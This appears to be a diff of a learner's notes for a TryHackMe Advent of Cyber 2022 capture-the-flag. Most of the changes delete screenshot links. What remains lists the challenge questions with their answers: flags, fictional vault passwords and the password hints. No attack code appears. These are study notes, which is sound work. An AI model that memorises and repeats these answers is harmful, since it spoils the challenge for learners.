-![[Pasted image 20221223121210.png]]
-![[Pasted image 20221223121229.png]]
-![[Pasted image 20221223121243.png]]
-![[Pasted image 20221223121301.png]]
-![[Pasted image 20221223121314.png]]
-
 *S3cr3tV@ultPW*
 
 Case 1: What is the Flag?  
-
-![[Pasted image 20221223121451.png]]
-![[Pasted image 20221223121505.png]]
-![[Pasted image 20221223121520.png]]
-![[Pasted image 20221223121535.png]]
-![[Pasted image 20221223121547.png]]
 
 *THM{EZ_fl@6!}*
 
 Case 2: What is Santa’s favourite thing?  
 
-![[Pasted image 20221223121608.png]]
-![[Pasted image 20221223121715.png]]
-![[Pasted image 20221223121737.png]]
-![[Pasted image 20221223121751.png]]
-![[Pasted image 20221223121819.png]]
-
 *MilkAndCookies*
 
 Case 2: What is the password for Santa’s Vault?  
-![[Pasted image 20221223121858.png]]
-![[Pasted image 20221223121912.png]]
 
 *3XtrR@_S3cr3tV@ultPW*
 
 Case 2: What is the Flag?  
 
-![[Pasted image 20221223121935.png]]
-![[Pasted image 20221223121950.png]]
-![[Pasted image 20221223122012.png]]
-
 *THM{m0@r_5t3pS_n0w!}*
 
 Case 3: What is the Executive Assistant’s favourite thing?  
 
-![[Pasted image 20221223122030.png]]
-![[Pasted image 20221223122211.png]]
-![[Pasted image 20221223122236.png]]
-![[Pasted image 20221223122300.png]]
-![[Pasted image 20221223122334.png]]
-![[Pasted image 20221223122358.png]]
-
 *BanoffeePie*
 
 Case 3: What is Santa’s previous password?  
-
-![[Pasted image 20221223123407.png]]
-
-![[Pasted image 20221223122731.png]]
-
-![[Pasted image 20221223122834.png]]
 
 *H0tCh0coL@t3_01*
 
@@ -8989,14 +8663,9 @@ Can’t really blame Santa if he’s too lazy for big password changes… He’s
 
 Case 3: What is the 1st part of the vault’s password?  
 
-![[Pasted image 20221223123438.png]]
-![[Pasted image 20221223123454.png]]
-
 *N3w4nd1m*
 
 Case 3: What is the 2nd part of the vault’s password?  
-
-![[Pasted image 20221223122800.png]]
 
 *Pr0v3dV@ultPW*
 
@@ -9006,9 +8675,6 @@ Case 3: What is the password for Santa’s Vault?
 
 Case 3: What is the Flag?  
 
-![[Pasted image 20221223123536.png]]
-![[Pasted image 20221223123546.png]]
-
 *THM{B@d_Y3t1_1s_n@u6hty}*
 
 What is Santa's Code?  
@@ -9017,13 +8683,9 @@ What is Santa's Code?
 
 Mission ELFPossible: What is the Abominable for a Day Flag?  
 
-![[Pasted image 20221223123622.png]]
-
 *THM{D3f3n5e_1n_D3pth_1s_k00L!!}*
 
 If you'd like to learn more about mitigating and managing potential adversary actions, check out the [T](https://tryhackme.com/module/cyber-threat-intelligence)[hreat Intelligence](https://tryhackme.com/module/cyber-threat-intelligence) module!
-
-![[Pasted image 20221223123746.png]]
 
 nice game!!!
 
@@ -9041,8 +8703,6 @@ Please help us improve by answering [this 5-minute survey](https://forms.gle/gr
 
 Complete the form to get the answer to this question. Make sure to grab the flag before you click "Submit"!
 
-![[Pasted image 20221224112838.png]]
-
 *THM{AoC2022!thank_you!}*
 
 Continue learning with the [Pre Security](https://tryhackme.com/path/outline/presecurity), [Jr Penetration Tester](https://tryhackme.com/path/outline/jrpenetrationtester), or [SOC Level 1](https://tryhackme.com/path/outline/soclevel1) pathway!  
@@ -9052,7 +8712,6 @@ Continue learning with the [Pre Security](https://tryhackme.com/path/outline/pr
 The prize winners will be announced on the 28th of December - you have until then to complete the tasks. Remember, the more questions you answer, the higher your chance of winning!   
   
 The daily prize winners for the last week of the event will be announced on Twitter on Wednesday, December 28th.
-
 
 ###  [Day 24] The EndThe Year of the Bandit Yeti
 
@@ -9121,7 +8780,6 @@ Are you ready to continue your learning journey on TryHackMe? (Yea,Yea)
 *Yea*
 
 Thx Tryhackme, I learned alot!!
-
 
 [[Intro to Malware Analysis]]
 
